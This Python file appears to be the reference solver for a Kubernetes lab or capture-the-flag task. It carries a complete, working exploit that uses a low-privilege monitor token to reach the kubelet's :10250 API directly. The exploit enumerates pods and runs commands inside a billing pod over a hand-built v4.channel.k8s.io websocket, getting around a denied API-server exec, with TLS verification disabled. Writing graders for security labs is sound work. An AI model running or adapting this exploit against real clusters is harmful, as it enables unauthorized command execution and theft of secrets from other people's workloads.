#!/usr/bin/env python3
"""Deterministic reference oracle for kubelet-proxy (frozen S0-S5 contract).

Runs inside the attacker container on solver-net with the read-only cred
volume at /opt/creds (monitor-token, ca.crt, api-url). The chain is
stage-gated exactly as frozen in solution/README.md — no direct-wss before
S2 enumeration (divergence 4):

  S0 boot sanity   creds present and well-formed; no admin kubeconfig
  S1 verb gate     API-server POST .../proxy/exec -> 403 (single attempt)
  S2 enumerate     GET /api/v1/nodes -> kubelet :10250/pods (<=5 x 2 s)
  S3 exec          wss /exec/billing/ledger-sync-01/sync with the
                   v4.channel.k8s.io handshake (<=5 x 3 s, fresh conn each)
  S4 isolation     direct TCP to the pod IP must be unreachable (1 attempt)
  S5 flag          stdout must carry flag{32 lowercase hex}; print it

No websocat and no pwntools: the websocket client mirrors
src/tools/wsfallback.py (same v4 convention, first payload byte selects the
stream: 0 stdin, 1 stdout, 2 stderr, 3 error, 4 resize, 0xff closes a
stream; client frames masked) and is kept inline so this oracle is a single
self-contained stdlib file. TLS is unverified on purpose — kubelet serves a
self-signed cert and the frozen recipe is curl -k / websocat --insecure.
/run/flag.ref is the verifier's reference on k3s-server and is deliberately
never read here.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import socket
import ssl
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from contextlib import suppress
from typing import NoReturn

CREDS_DIR = "/opt/creds"
TOKEN_FILE = CREDS_DIR + "/monitor-token"
CA_FILE = CREDS_DIR + "/ca.crt"
API_URL_FILE = CREDS_DIR + "/api-url"

NODE_NAME = "k3s-agt-01"
NAMESPACE = "billing"
POD_NAME = "ledger-sync-01"
CONTAINER = "sync"
SNAPSHOT = "/srv/ledger/snapshots/current.token"

KUBELET_PORT = 10250
S2_ATTEMPTS = 5
S2_SLEEP = 2.0
S3_ATTEMPTS = 5
S3_SLEEP = 3.0
S3_IO_TIMEOUT = 5.0
S4_PROBE_PORTS = (1025, 80)
S4_TIMEOUT = 3.0

WS_SUBPROTOCOL = "v4.channel.k8s.io"
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
FLAG_RE = re.compile(r"flag\{[0-9a-f]{32}\}")


class AttemptError(RuntimeError):
    """Recoverable per-attempt failure; retried only inside bounded stages."""


def audit(stage: str, msg: str) -> None:
    print(f"[{stage}] {msg}", flush=True)


def fail(stage: str, msg: str) -> NoReturn:
    print(f"[{stage}] FAIL {msg}", file=sys.stderr, flush=True)
    raise SystemExit(1)


def _read(path: str) -> str:
    with open(path, encoding="utf-8") as fh:
        return fh.read().strip()


# --------------------------------------------------------------------------
# S0 — boot sanity
# --------------------------------------------------------------------------


def s0_boot_sanity() -> tuple[str, str]:
    for path in (TOKEN_FILE, CA_FILE, API_URL_FILE):
        if not os.path.isfile(path):
            fail("s0", f"missing cred file {path}")
        if os.path.getsize(path) == 0:
            fail("s0", f"empty cred file {path}")

    # The monitor kubeconfig-equivalent is exactly token + CA + URL; any
    # admin-shaped file in the shared volume is a leak and aborts the run.
    entries = sorted(os.listdir(CREDS_DIR))
    for entry in entries:
        low = entry.lower()
        if "kubeconfig" in low or low.startswith("admin"):
            fail("s0", f"admin credential leaked into {CREDS_DIR}: {entry}")

    token = _read(TOKEN_FILE)
    if token.count(".") != 2 or any(not seg for seg in token.split(".")):
        fail("s0", "monitor-token is not a well-formed JWT (want 3 dot-separated segments)")

    api_url = _read(API_URL_FILE)
    parsed = urllib.parse.urlparse(api_url)
    if parsed.scheme != "https" or not parsed.hostname:
        fail("s0", f"api-url is not an https URL: {api_url!r}")
    try:
        ctx = ssl.create_default_context()
        ctx.load_verify_locations(cafile=CA_FILE)
    except (ssl.SSLError, OSError) as exc:
        fail("s0", f"ca.crt is not a usable PEM bundle: {exc}")

    extra = [e for e in entries if e not in ("api-url", "ca.crt", "monitor-token")]
    suffix = f" extra={','.join(extra)}" if extra else ""
    audit(
        "s0",
        f"expected=creds-present+valid got=ok token=jwt({len(token)}b) "
        f"ca=pem api={api_url}{suffix}",
    )
    return api_url, token


# --------------------------------------------------------------------------
# HTTP helper (CA ignored for live checks: frozen curl -k / --insecure)
# --------------------------------------------------------------------------


def _tls_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def http_request(
    method: str, url: str, token: str, timeout: float, body: bytes | None = None
) -> tuple[int, str]:
    req = urllib.request.Request(url, method=method, data=body)
    req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_tls_ctx()) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


# --------------------------------------------------------------------------
# S1 — API-server verb gate (POST must be denied; single attempt)
# --------------------------------------------------------------------------


def _status_message(body: str) -> str:
    """RBAC text lives in the Status JSON message, where quotes are escaped."""
    try:
        obj = json.loads(body)
    except json.JSONDecodeError:
        return body.replace('\\"', '"')
    if isinstance(obj, dict) and isinstance(obj.get("message"), str):
        return obj["message"]
    return body.replace('\\"', '"')


def s1_verb_gate(api_url: str, token: str) -> None:
    url = (
        f"{api_url}/api/v1/nodes/{NODE_NAME}/proxy/exec/"
        f"{NAMESPACE}/{POD_NAME}/{CONTAINER}?command=id&stdout=true"
    )
    try:
        code, body = http_request("POST", url, token, timeout=15.0, body=b"")
    except OSError as exc:
        fail("s1", f"single-attempt POST could not reach {api_url}: {exc}")
    marker = 'cannot create resource "nodes/proxy"'
    message = _status_message(body)
    audit("s1", f"expected=403+{marker!r} got={code} message={message[:200]!r}")
    if code != 403 or marker not in message:
        fail("s1", f"verb gate broke: expected 403 with {marker!r}, got HTTP {code}")


# --------------------------------------------------------------------------
# S2 — enumerate: API nodes -> kubelet /pods (<=5 x 2 s cold-start retry)
# --------------------------------------------------------------------------


def _node_ip(api_url: str, token: str) -> str:
    try:
        code, body = http_request("GET", f"{api_url}/api/v1/nodes", token, timeout=15.0)
    except OSError as exc:
        raise AttemptError(f"GET /api/v1/nodes: {exc}") from exc
    if code in (401, 403):
        fail("s2", f"nodes list denied (HTTP {code}); RBAC is static post-seed")
    if code != 200:
        raise AttemptError(f"GET /api/v1/nodes -> HTTP {code}")
    try:
        items = json.loads(body).get("items", [])
    except (json.JSONDecodeError, AttributeError) as exc:
        raise AttemptError(f"nodes list is not a JSON object: {exc}") from exc
    for node in items:
        if node.get("metadata", {}).get("name") != NODE_NAME:
            continue
        for addr in node.get("status", {}).get("addresses", []):
            if addr.get("type") == "InternalIP" and addr.get("address"):
                return addr["address"]
        raise AttemptError(f"node {NODE_NAME} has no InternalIP address")
    raise AttemptError(f"node {NODE_NAME} not in the node list")


def _pod_facts(node_ip: str, token: str) -> tuple[str, str]:
    try:
        code, body = http_request(
            "GET", f"https://{node_ip}:{KUBELET_PORT}/pods", token, timeout=15.0
        )
    except OSError as exc:
        raise AttemptError(f"GET kubelet /pods: {exc}") from exc
    if code in (401, 403):
        fail("s2", f"kubelet /pods denied (HTTP {code}); monitor token cannot enumerate")
    if code != 200:
        raise AttemptError(f"GET kubelet /pods -> HTTP {code}")
    try:
        items = json.loads(body).get("items", [])
    except (json.JSONDecodeError, AttributeError) as exc:
        raise AttemptError(f"kubelet /pods is not a JSON object: {exc}") from exc
    for pod in items:
        meta = pod.get("metadata", {})
        if meta.get("namespace") != NAMESPACE or meta.get("name") != POD_NAME:
            continue
        if pod.get("spec", {}).get("nodeName") != NODE_NAME:
            raise AttemptError(f"pod {NAMESPACE}/{POD_NAME} is not scheduled on {NODE_NAME}")
        names = [c.get("name") for c in pod.get("spec", {}).get("containers", [])]
        if CONTAINER not in names:
            raise AttemptError(f"container {CONTAINER!r} missing from pod (have {names})")
        pod_ip = pod.get("status", {}).get("podIP")
        if not pod_ip:
            raise AttemptError("pod has no status.podIP")
        return pod_ip, str(meta.get("uid", "?"))
    raise AttemptError(f"pod {NAMESPACE}/{POD_NAME} not listed on {NODE_NAME}")


def s2_enumerate(api_url: str, token: str) -> tuple[str, str, str]:
    last = "no attempt ran"
    for attempt in range(1, S2_ATTEMPTS + 1):
        try:
            node_ip = _node_ip(api_url, token)
            pod_ip, pod_uid = _pod_facts(node_ip, token)
        except AttemptError as exc:
            last = str(exc)
            if attempt < S2_ATTEMPTS:
                audit("s2", f"attempt={attempt} cold-start retry in {S2_SLEEP:g}s: {exc}")
                time.sleep(S2_SLEEP)
            continue
        audit(
            "s2",
            f"attempt={attempt} expected=200+billing/{POD_NAME}/{CONTAINER} "
            f"got=200 node-ip={node_ip} pod-ip={pod_ip} pod-uid={pod_uid}",
        )
        return node_ip, pod_ip, pod_uid
    fail("s2", f"enumerate failed after {S2_ATTEMPTS} attempts: {last}")


# --------------------------------------------------------------------------
# S3 — v4.channel.k8s.io exec over wss (<=5 x 3 s, fresh connection each)
# --------------------------------------------------------------------------


def recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return buf
        buf += chunk
    return buf


def ws_send(sock: socket.socket, opcode: int, payload: bytes = b"") -> None:
    # Client frames are masked; random mask per frame (v4 binary opcode 0x2).
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    n = len(payload)
    if n < 126:
        header = bytes([0x80 | opcode, 0x80 | n])
    elif n < 1 << 16:
        header = bytes([0x80 | opcode, 0x80 | 126]) + struct.pack(">H", n)
    else:
        header = bytes([0x80 | opcode, 0x80 | 127]) + struct.pack(">Q", n)
    sock.sendall(header + mask + masked)


def ws_recv_frame(sock: socket.socket) -> tuple[bool, int, bytes] | None:
    header = recv_exact(sock, 2)
    if len(header) < 2:
        return None
    fin = bool(header[0] & 0x80)
    opcode = header[0] & 0x0F
    masked = bool(header[1] & 0x80)
    length = header[1] & 0x7F
    if length == 126:
        ext = recv_exact(sock, 2)
        if len(ext) < 2:
            return None
        length = struct.unpack(">H", ext)[0]
    elif length == 127:
        ext = recv_exact(sock, 8)
        if len(ext) < 8:
            return None
        length = struct.unpack(">Q", ext)[0]
    mask = b""
    if masked:  # servers never mask, but tolerate it
        mask = recv_exact(sock, 4)
        if len(mask) < 4:
            return None
    payload = recv_exact(sock, length) if length else b""
    if len(payload) < length:
        return None
    if masked:
        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return fin, opcode, payload


def ws_connect(url: str, headers: dict[str, str], timeout: float) -> socket.socket:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("wss", "ws"):
        raise AttemptError(f"unsupported websocket scheme: {url!r}")
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "wss" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    sock = socket.create_connection((host, port), timeout=timeout)
    if parsed.scheme == "wss":
        # Kubelet serving certs are self-signed; same as curl -k.
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)

    key = base64.b64encode(os.urandom(16)).decode()
    request = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}:{port}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        f"Sec-WebSocket-Key: {key}",
        "Sec-WebSocket-Version: 13",
        f"Sec-WebSocket-Protocol: {WS_SUBPROTOCOL}",
    ] + [f"{name}: {value}" for name, value in headers.items()]
    sock.sendall(("\r\n".join(request) + "\r\n\r\n").encode())

    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = sock.recv(4096)
        if not chunk:
            sock.close()
            raise AttemptError("connection closed during websocket handshake")
        resp += chunk
    head, _, tail = resp.partition(b"\r\n\r\n")
    lines = head.decode(errors="replace").split("\r\n")
    status = lines[0]
    if " 101" not in status:
        sock.close()
        raise AttemptError(f"upgrade refused: {status} {tail[:200].decode(errors='replace')}")

    got: dict[str, str] = {}
    for line in lines[1:]:
        name, _, value = line.partition(":")
        got.setdefault(name.strip().lower(), value.strip())
    expected = base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()
    if got.get("sec-websocket-accept") != expected:
        sock.close()
        raise AttemptError("upgrade accepted but Sec-WebSocket-Accept mismatch")
    if got.get("sec-websocket-protocol") != WS_SUBPROTOCOL:
        sock.close()
        raise AttemptError(f"subprotocol mismatch: {got.get('sec-websocket-protocol')!r}")
    return sock


class ExecResult:
    __slots__ = ("channels", "channels_seen", "close_code")

    def __init__(self) -> None:
        self.channels: dict[int, bytearray] = {1: bytearray(), 2: bytearray(), 3: bytearray()}
        self.channels_seen: set[int] = set()
        self.close_code: int | None = None

    def text(self, channel: int) -> str:
        return bytes(self.channels.get(channel, b"")).decode(errors="replace")


def ws_exec_once(
    node_ip: str, token: str, port: int = KUBELET_PORT, scheme: str = "wss"
) -> ExecResult:
    url = (
        f"{scheme}://{node_ip}:{port}/exec/{NAMESPACE}/{POD_NAME}/{CONTAINER}"
        f"?output=1&error=1&command=cat&command={SNAPSHOT}"
    )
    sock = ws_connect(url, {"Authorization": "Bearer " + token}, S3_IO_TIMEOUT)
    result = ExecResult()
    try:
        # Close the stdin stream (v4 channel 0, 0xff closes it) so `cat`
        # sees EOF and exits; mirrors wsfallback.py.
        ws_send(sock, 0x2, b"\x00\xff")
        deadline = time.monotonic() + S3_IO_TIMEOUT
        pending_opcode: int | None = None
        pending = bytearray()
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            sock.settimeout(remaining)
            frame = ws_recv_frame(sock)
            if frame is None:
                break
            fin, opcode, payload = frame
            if opcode == 0x8:  # close
                if len(payload) >= 2:
                    result.close_code = struct.unpack(">H", payload[:2])[0]
                break
            if opcode == 0x9:  # ping -> pong
                try:
                    ws_send(sock, 0xA, payload)
                except OSError:
                    break
                continue
            if opcode == 0xA:  # pong
                continue
            if opcode == 0x0:  # continuation
                if pending_opcode is None:
                    continue
                pending += payload
            else:
                pending_opcode = opcode
                pending = bytearray(payload)
            if not fin:
                continue
            if pending_opcode in (0x1, 0x2) and pending:
                message = bytes(pending)
                channel = message[0]
                result.channels_seen.add(channel)
                if channel in result.channels:
                    result.channels[channel] += message[1:]
            pending_opcode = None
            pending = bytearray()
    except (TimeoutError, OSError):
        pass
    finally:
        with suppress(OSError):
            sock.close()
    return result


def s3_exec(node_ip: str, token: str) -> str:
    last = "no attempt ran"
    for attempt in range(1, S3_ATTEMPTS + 1):
        try:
            result = ws_exec_once(node_ip, token)
            stdout = result.text(1)
            matches = sorted(set(FLAG_RE.findall(stdout)))
            if 1 not in result.channels_seen or not result.channels[1]:
                raise AttemptError(
                    f"no v4 stdout frames (channels seen {sorted(result.channels_seen)}; "
                    f"stderr={result.text(2)[:120]!r} error={result.text(3)[:120]!r})"
                )
            if len(matches) != 1:
                raise AttemptError(
                    f"expected exactly one flag on channel 1, got {matches!r}; "
                    f"stderr={result.text(2)[:120]!r} error={result.text(3)[:120]!r}"
                )
            flag = matches[0]
            if not FLAG_RE.fullmatch(flag):
                raise AttemptError(f"flag shape mismatch: {flag!r}")
        except (AttemptError, TimeoutError, OSError) as exc:
            last = str(exc)
            audit("s3", f"attempt={attempt} fresh-connection retry in {S3_SLEEP:g}s: {exc}")
            if attempt < S3_ATTEMPTS:
                time.sleep(S3_SLEEP)
            continue
        audit(
            "s3",
            f"attempt={attempt} expected=101+{WS_SUBPROTOCOL}+stdout-flag "
            f"got=101 flag={flag} stdout={stdout!r}",
        )
        return flag
    fail("s3", f"exec failed after {S3_ATTEMPTS} fresh connections: {last}")


# --------------------------------------------------------------------------
# S4 — isolation: direct TCP to the pod IP must be unreachable (1 attempt)
# --------------------------------------------------------------------------


def s4_isolation(pod_ip: str) -> str:
    details = []
    for port in S4_PROBE_PORTS:
        try:
            with socket.create_connection((pod_ip, port), timeout=S4_TIMEOUT):
                fail(
                    "s4",
                    f"direct TCP to {pod_ip}:{port} succeeded — network split is broken",
                )
        except OSError as exc:
            details.append(f"{port}:{type(exc).__name__}")
    joined = ",".join(details)
    audit("s4", f"attempt=1 expected=direct-unreachable got={joined}")
    return joined


# --------------------------------------------------------------------------
# S5 — flag shape + print
# --------------------------------------------------------------------------


def s5_flag(flag: str) -> None:
    if not FLAG_RE.fullmatch(flag):
        fail("s5", f"flag shape mismatch: {flag!r}")
    print(flag, flush=True)
    audit("s5", f"expected=flag{{32 lowercase hex}} got={flag} ok")


def main() -> int:
    api_url, token = s0_boot_sanity()
    s1_verb_gate(api_url, token)
    node_ip, pod_ip, pod_uid = s2_enumerate(api_url, token)
    flag = s3_exec(node_ip, token)
    isolation = s4_isolation(pod_ip)
    s5_flag(flag)
    audit(
        "oracle",
        f"triple-proof ok: POST-403 + direct-unreachable({isolation}) + "
        f"exec-success(node={NODE_NAME} pod-uid={pod_uid})",
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
